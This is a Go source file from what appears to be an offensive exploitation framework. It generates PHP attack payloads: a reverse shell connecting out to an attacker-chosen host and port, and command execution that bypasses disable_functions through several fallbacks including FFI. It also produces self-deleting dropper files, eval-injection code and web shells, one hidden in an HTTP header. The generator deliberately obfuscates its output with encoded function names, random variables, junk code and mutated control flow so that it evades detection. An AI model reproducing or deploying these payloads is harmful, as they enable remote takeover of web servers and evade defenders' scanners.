package payload

import "github.com/Chocapikk/pik/sdk"

func init() {
	sdk.SetPHPReverseShell(PHPReverseShellDrop)
	sdk.SetPHPSystem(PHPSystemDrop)
	sdk.SetPHPEvalShell(PHPEvalReverseShell)
	sdk.SetPHPEvalSystem(PHPEvalSystemExec)
}

// phpReverseShell returns raw PHP code for a reverse shell via proc_open.
func phpReverseShell(lhost string, lport int) string {
	vFs := phpVarName()
	vPo := phpVarName()
	return sdk.Sprintf(
		`$%s=%s;$%s=%s;$s=$%s("%s",%d);$p=$%s(%s,[0=>$s,1=>$s,2=>$s],$pipes);`,
		vFs, phpEncodeStr("fsockopen"), vPo, phpEncodeStr("proc_open"),
		vFs, lhost, lport, vPo, phpEncodeStr("/bin/bash -i"),
	)
}

// phpExecCmd returns raw PHP code that executes a shell command using
// multiple fallback functions, bypassing disable_functions restrictions.
// Polymorphic: variable names, preamble order, function order, condition
// structure, string encoding, and call style are all randomized per generation.
func phpExecCmd(cmd string) string {
	b64 := sdk.Base64Encode(cmd)
	v := phpVars("d", "c", "f", "r", "p")
	d, c, f, r, p := v["d"], v["c"], v["f"], v["r"], v["p"]

	vEr, vStl, vIua := phpVarName(), phpVarName(), phpVarName()
	preamble := sdk.Shuffle([]string{
		sdk.Sprintf(`$%s=%s;@$%s(0)`, vEr, phpEncodeStr("error_reporting"), vEr),
		sdk.Sprintf(`$%s=%s;@$%s(0)`, vStl, phpEncodeStr("set_time_limit"), vStl),
		sdk.Sprintf(`$%s=%s;@$%s(1)`, vIua, phpEncodeStr("ignore_user_abort"), vIua),
	})

	// Encode each function name differently for the foreach array.
	simple := sdk.Shuffle([]string{"system", "passthru", "shell_exec", "exec"})
	encoded := make([]string, len(simple))
	for i, fn := range simple {
		encoded[i] = phpEncodeStr(fn)
	}

	guard := phpGuard(f, d)
	call := phpCall(f, c)

	// Each heavy fallback assigns an encoded function name to a temp var,
	// then calls it indirectly - no plaintext function names in output.
	vPo := phpVarName()
	vPc := phpVarName()
	vPr := phpVarName()
	vPe := phpVarName()
	vFfi := phpVarName()

	heavy := sdk.Shuffle([]string{
		phpIfWrap(phpCond(r, d, "popen"),
			sdk.Sprintf(`$%s=%s;$%s=%s;@$%s($%s($%s,%s));$%s=%s;`,
				vPo, phpEncodeStr("popen"), vPc, phpEncodeStr("pclose"),
				vPc, vPo, c, phpEncodeStr("r"), r, phpOne())),
		phpIfWrap(phpCond(r, d, "proc_open"),
			sdk.Sprintf(`$%s=%s;@$%s($%s,[[%s,%s],[%s,%s],[%s,%s]],$%s);$%s=%s;`,
				vPr, phpEncodeStr("proc_open"),
				vPr, c,
				phpEncodeStr("pipe"), phpEncodeStr("r"),
				phpEncodeStr("pipe"), phpEncodeStr("w"),
				phpEncodeStr("pipe"), phpEncodeStr("w"),
				p, r, phpOne())),
		phpIfWrap(phpCond(r, d, "pcntl_exec"),
			sdk.Sprintf(`$%s=%s;@$%s(%s,[%s,$%s]);$%s=%s;`,
				vPe, phpEncodeStr("pcntl_exec"),
				vPe, phpEncodeStr("/bin/sh"), phpEncodeStr("-c"), c, r, phpOne())),
		func() string {
			vCd, vSy := phpVarName(), phpVarName()
			return phpIfWrap(sdk.Sprintf(`!$%s`, r),
				sdk.Sprintf(`$%s=%s;`+phpIfWrap(sdk.Sprintf(`$%s(%s)`, vFfi, phpEncodeStr("FFI")),
					sdk.Sprintf(`$%s=%s;$%s=%s;$%s=%s;@$%s::{$%s}(%s)->{$%s}($%s);$%s=%s;`,
						vFfi, phpEncodeStr("FFI"),
						vCd, phpEncodeStr("cdef"),
						vSy, phpEncodeStr("system"),
						vFfi, vCd, phpEncodeStr("int system(const char *command);"),
						vSy, c, r, phpOne())),
					vFfi, phpEncodeStr("class_exists")))
		}(),
	})

	vIni := phpVarName()
	vB64 := phpVarName()

	j1, j2, j3 := phpMaybeJunk(), phpMaybeJunk(), phpMaybeJunk()

	osCheck := phpIfWrap(
		sdk.Sprintf(`(%s)(PHP_OS,%s)`, phpEncodeStr("stristr"), phpEncodeStr("win")),
		sdk.Sprintf(`$%s.=" 2>&1\n";`, c))

	foreachBody := phpIfWrapInner(guard,
		sdk.Sprintf(`%s;$%s=%s;break;`, call, r, phpOne()))

	return sdk.Sprintf(`%s;%s;%s;%s`+
		`$%s=%s;$%s=%s;$%s=@$%s(%s);$%s=$%s('%s');`+
		`%s`+
		`$%s=%s;%s`+
		`foreach([%s,%s,%s,%s] as $%s){%s}`+
		`%s%s%s%s%s`,
		preamble[0], preamble[1], preamble[2], j1,
		vIni, phpEncodeStr("ini_get"), vB64, phpEncodeStr("base64_decode"),
		d, vIni, phpEncodeStr("disable_functions"), c, vB64, b64,
		osCheck,
		r, phpZero(), j2,
		encoded[0], encoded[1], encoded[2], encoded[3], f, foreachBody,
		j3, heavy[0], heavy[1], heavy[2], heavy[3],
	)
}

// --- Condition generators (polymorphic) ---

func phpCond(r, d, fn string) string {
	parts := sdk.Shuffle([]string{phpNotRan(r), phpExistsEncoded(fn), phpNotDisabledEncoded(d, fn)})
	return parts[0] + "&&" + parts[1] + "&&" + parts[2]
}

func phpGuard(f, d string) string {
	exists := phpExistsVar(f)
	notDisabled := phpNotDisabledVar(d, f)
	if sdk.RandBool() {
		return exists + "&&" + notDisabled
	}
	return notDisabled + "&&" + exists
}

func phpCall(f, c string) string {
	if sdk.RandBool() {
		return sdk.Sprintf(`$%s($%s)`, f, c)
	}
	vCuf := phpVarName()
	return sdk.Sprintf(`$%s=%s;$%s($%s,$%s)`, vCuf, phpEncodeStr("call_user_func"), vCuf, f, c)
}

func phpNotRan(r string) string {
	switch sdk.RandInt(0, 2) {
	case 0:
		return sdk.Sprintf(`!$%s`, r)
	case 1:
		return sdk.Sprintf(`$%s==0`, r)
	default:
		return sdk.Sprintf(`0==$%s`, r)
	}
}

func phpExistsEncoded(fn string) string {
	return sdk.Sprintf(`(%s)(%s)`, phpEncodeStr(phpCheckName()), phpEncodeStr(fn))
}

func phpExistsVar(f string) string {
	return sdk.Sprintf(`(%s)($%s)`, phpEncodeStr(phpCheckName()), f)
}

func phpCheckName() string {
	if sdk.RandBool() {
		return "is_callable"
	}
	return "function_exists"
}

func phpNotDisabledEncoded(d, fn string) string {
	enc := phpEncodeStr(fn)
	stristr := phpEncodeStr("stristr")
	switch sdk.RandInt(0, 2) {
	case 0:
		return sdk.Sprintf(`!(%s)($%s,%s)`, stristr, d, enc)
	case 1:
		return sdk.Sprintf(`(%s)($%s,%s)===false`, stristr, d, enc)
	default:
		return sdk.Sprintf(`false===(%s)($%s,%s)`, stristr, d, enc)
	}
}

func phpNotDisabledVar(d, f string) string {
	stristr := phpEncodeStr("stristr")
	switch sdk.RandInt(0, 2) {
	case 0:
		return sdk.Sprintf(`!(%s)($%s,$%s)`, stristr, d, f)
	case 1:
		return sdk.Sprintf(`(%s)($%s,$%s)===false`, stristr, d, f)
	default:
		return sdk.Sprintf(`false===(%s)($%s,$%s)`, stristr, d, f)
	}
}

// --- Control flow mutation ---

// phpIfWrap wraps "if(cond){body}" in a random control flow structure.
func phpIfWrap(cond, body string) string {
	switch sdk.RandInt(0, 3) {
	case 0:
		return sdk.Sprintf(`if(%s){%s}`, cond, body)
	case 1:
		return sdk.Sprintf(`while(%s){%s;break;}`, cond, body)
	case 2:
		return sdk.Sprintf(`for(;%s;){%s;break;}`, cond, body)
	default:
		return sdk.Sprintf(`do{if(!(%s))break;%s}while(0);`, cond, body)
	}
}

// phpIfPrefix returns the opening of an if-like statement for inline use.
func phpIfPrefix() string {
	switch sdk.RandInt(0, 1) {
	case 0:
		return "if(("
	default:
		return "if(!!("
	}
}

// phpIfWrapInner wraps condition+body inside a foreach iteration.
func phpIfWrapInner(cond, body string) string {
	switch sdk.RandInt(0, 2) {
	case 0:
		return sdk.Sprintf(`if(%s){%s}`, cond, body)
	case 1:
		return sdk.Sprintf(`if(!(%s))continue;%s`, cond, body)
	default:
		return sdk.Sprintf(`if(%s){%s}`, cond, body)
	}
}

// phpZero returns a random expression that evaluates to 0.
func phpZero() string {
	switch sdk.RandInt(0, 3) {
	case 0:
		return "0"
	case 1:
		return "0|0"
	case 2:
		return sdk.Sprintf(`%s('')`, phpEncodeStr("intval"))
	default:
		return sdk.Sprintf(`%s('')`, phpEncodeStr("strlen"))
	}
}

// phpOne returns a random expression that evaluates to 1.
func phpOne() string {
	switch sdk.RandInt(0, 2) {
	case 0:
		return "1"
	case 1:
		return "!!1"
	default:
		return sdk.Sprintf(`%s('1')`, phpEncodeStr("intval"))
	}
}

// phpJunk returns a random dead code statement.
func phpJunk() string {
	v := phpVarName()
	switch sdk.RandInt(0, 4) {
	case 0:
		return sdk.Sprintf(`$%s=%s(%s)`, v, phpEncodeStr("str_repeat"), phpEncodeStr(sdk.RandAlpha(1)))
	case 1:
		return sdk.Sprintf(`$%s=%s()`, v, phpEncodeStr("time"))
	case 2:
		return sdk.Sprintf(`$%s=%s(0,%s)`, v, phpEncodeStr("str_pad"), phpEncodeStr(sdk.RandAlpha(1)))
	case 3:
		return sdk.Sprintf(`$%s=%s(%s)`, v, phpEncodeStr("md5"), phpEncodeStr(sdk.RandAlpha(4)))
	default:
		return sdk.Sprintf(`$%s=%s()`, v, phpEncodeStr("microtime"))
	}
}

// phpMaybeJunk returns junk code with a separator, or empty string.
func phpMaybeJunk() string {
	if sdk.RandBool() {
		return phpJunk() + ";"
	}
	return ""
}

// --- String encoding (polymorphic) ---

func phpEncodeStr(s string) string {
	switch sdk.RandInt(0, 2) {
	case 0:
		return sdk.Sprintf(`base64_decode('%s')`, sdk.Base64Encode(s))
	case 1:
		return sdk.Sprintf(`str_rot13('%s')`, sdk.ROT13(s))
	default:
		return sdk.Sprintf(`hex2bin('%s')`, sdk.HexEncode(s))
	}
}

func phpChrConcat(s string) string {
	var out string
	for i, b := range []byte(s) {
		if i > 0 {
			out += "."
		}
		out += sdk.Sprintf("chr(%d)", b)
	}
	return out
}

func phpVarName() string { return sdk.RandAlpha(6) }

func phpVars(names ...string) map[string]string {
	m := make(map[string]string, len(names))
	for _, n := range names {
		m[n] = sdk.RandAlpha(6)
	}
	return m
}

// --- Drop wrappers (file-based) ---

func phpDrop(code string) string { return sdk.Sprintf(`<?php unlink(__FILE__);%s ?>`, code) }

// PHPReverseShellDrop returns a self-deleting PHP reverse shell for file drop.
func PHPReverseShellDrop(lhost string, lport int) string { return phpDrop(phpReverseShell(lhost, lport)) }

// PHPSystemDrop returns a self-deleting PHP system exec for file drop.
func PHPSystemDrop(cmd string) string { return phpDrop(phpExecCmd(cmd)) }

// --- Eval wrappers (no tags, for eval() injection) ---

// PHPEvalReverseShell returns raw PHP code for eval() injection.
func PHPEvalReverseShell(lhost string, lport int) string { return phpReverseShell(lhost, lport) }

// PHPEvalSystemExec returns raw PHP code for eval() injection.
func PHPEvalSystemExec(cmd string) string { return phpExecCmd(cmd) }

// --- Webshells ---

// PHPWebShell returns a minimal PHP web shell.
func PHPWebShell(param string) string {
	if param == "" {
		param = "cmd"
	}
	return sdk.Sprintf(`<?php system($_GET["%s"]); ?>`, param)
}

// PHPWebShellPassthru returns a PHP web shell using passthru for binary output.
func PHPWebShellPassthru(param string) string {
	if param == "" {
		param = "cmd"
	}
	return sdk.Sprintf(`<?php passthru($_GET["%s"]); ?>`, param)
}

// PHPWebShellPost returns a PHP web shell that reads from POST body.
func PHPWebShellPost(param string) string {
	if param == "" {
		param = "cmd"
	}
	return sdk.Sprintf(`<?php if(isset($_POST["%s"])){system($_POST["%s"]);} ?>`, param, param)
}

// PHPWebShellStealth returns a PHP web shell hidden in a header.
func PHPWebShellStealth(header string) string {
	if header == "" {
		header = "X-Cmd"
	}
	return sdk.Sprintf(
		`<?php if(isset($_SERVER["HTTP_%s"])){system($_SERVER["HTTP_%s"]);} ?>`,
		phpHeaderKey(header), phpHeaderKey(header),
	)
}

// PHPEval returns a PHP eval shell (POST parameter).
func PHPEval(param string) string {
	if param == "" {
		param = "code"
	}
	return sdk.Sprintf(`<?php eval($_POST["%s"]); ?>`, param)
}

func phpHeaderKey(header string) string {
	result := make([]byte, 0, len(header))
	for _, c := range header {
		switch {
		case c == '-':
			result = append(result, '_')
		case c >= 'a' && c <= 'z':
			result = append(result, byte(c-32))
		default:
			result = append(result, byte(c))
		}
	}
	return string(result)
}
